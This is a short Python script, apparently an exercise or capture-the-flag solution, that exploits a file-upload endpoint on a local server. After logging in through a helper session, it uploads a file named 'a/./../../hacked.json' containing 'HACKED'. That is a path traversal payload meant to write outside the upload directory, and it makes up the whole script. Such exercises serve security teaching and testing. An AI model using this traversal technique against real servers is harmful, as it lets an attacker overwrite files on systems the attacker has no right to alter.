import os
import requests
import solution_q1


def post_file(server_addr, relpath, content, s):
    return s.post(server_addr + '/upload', files={
        'upload': (relpath, content)
    })


def solve(server_addr):
    s = solution_q1.make_login_session()
    response = post_file(server_addr, 'a/./../../hacked.json', 'HACKED', s)
    print(response.text)


if __name__ == '__main__':
    solve('http://localhost:8000')

